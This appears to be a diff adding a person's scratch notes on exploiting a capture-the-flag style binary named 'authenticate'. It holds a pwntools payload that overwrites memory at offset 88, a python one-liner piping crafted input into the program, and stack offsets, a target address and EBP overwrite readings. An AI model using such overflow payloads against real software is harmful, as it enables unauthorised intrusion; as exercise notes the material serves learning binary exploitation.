@@ -1,0 +1,27 @@
+hash: f87cd601aa7fedca99018a8be88eda34
+main
+Base64Decode
+calcDecodeLength
+auth
+calc_md5
+
+p = process('./authenticate')
+p.sendline(flat({88:0x20}))
+p.interactive()
+
+local_32: esp + 0x1e
+local_38: esp + 0x18
+local_14: esp + 0x3c
+
+correct: 0x80493d4
+
+ret addr main: 0xffffd26c
+
+python -c "print 'a'*16 + '=='" | ./authenticate
+
+main ret val: $ebp + 4: 0xffffd26c
+local_32: $esp + 0x1e: 0xffffd23e
+
+EBP 0x9aa6699a - 0x61616161
+EBP 0xdbb66ddb - 0x62626262
+0xff00009a
